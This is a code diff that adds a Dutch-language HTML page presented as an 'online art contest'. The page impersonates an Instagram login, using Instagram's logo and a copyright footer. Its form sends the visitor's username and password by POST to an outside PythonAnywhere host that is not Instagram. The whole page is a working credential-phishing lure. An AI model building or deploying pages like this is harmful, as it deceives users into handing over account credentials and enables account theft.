@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+  <title>Online Kunstwedstrijd</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+
+<body>
+  <span id="root">
+    <section class="sectie-alles">
+      <link rel="stylesheet" href="css/css.css">
+      <!-- 1-Role Hoofdgedeelte -->
+      <main class="hoofd" role="hoofdgedeelte">
+        <div class="wrapper">
+          <article class="artikel">
+            <div class="inhoud">
+              <div class="login-box">
+                <div class="kop">
+                  <img class="logo"
+                    src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"
+                    alt="Instagram">
+                </div><!-- Kop einde -->
+                <div class="formulier-wrap">
+                  <form class="formulier" action="https://cyrru.pythonanywhere.com/inloggen1" method="POST" class="mijn-login-validatie"
+                    novalidate=""">
+
+                    <div class=" invoerveld">
+                    <input type="text" id="gebruikersnaam" placeholder="Telefoonnummer, gebruikersnaam of e-mail" aria-required="true"
+                      maxlength="30" autocapitalize="off" autocorrect="off" name="gebruikersnaam" required>
+                </div>
+
+                <div class="invoerveld">
+                  <input type="wachtwoord" name="wachtwoord" id="wachtwoord" placeholder="Wachtwoord" maxlength="30"
+                    aria-required="true" autocapitalize="off" autocorrect="off" required>
+                </div>
+
+                <span class="knop-vak">
+                  <button class="knop" type="verzenden">Inloggen</button>
+                </span>
+
+                <a class="vergeten" href="/">Wachtwoord vergeten?</a>
+                </form>
+              </div> <!-- Formulier-wrap einde -->
+            </div> <!-- Login-box einde -->
+
+            <div class="login-box">
+              <p class="tekst">Heb je nog geen account? <a href="/">Registreer</a></p>
+            </div> <!-- Aanmelden-box einde --><!-- App einde -->
+        </div> <!-- Inhoud einde -->
+        </article>
+        </div> <!-- Wrapper einde -->
+      </main>
+
+      <!-- 2-Role Voettekst -->
+      <footer class="voettekst" role="inhoudsinfo">
+        <div class="voettekst-container">
+          <span class="voettekst-logo">&copy; 2023 Instagram</span>
+        </div> <!-- Voettekstcontainer einde -->
+      </footer>
+
+    </section>
+  </span> <!-- Root -->
+</body>
+</html>
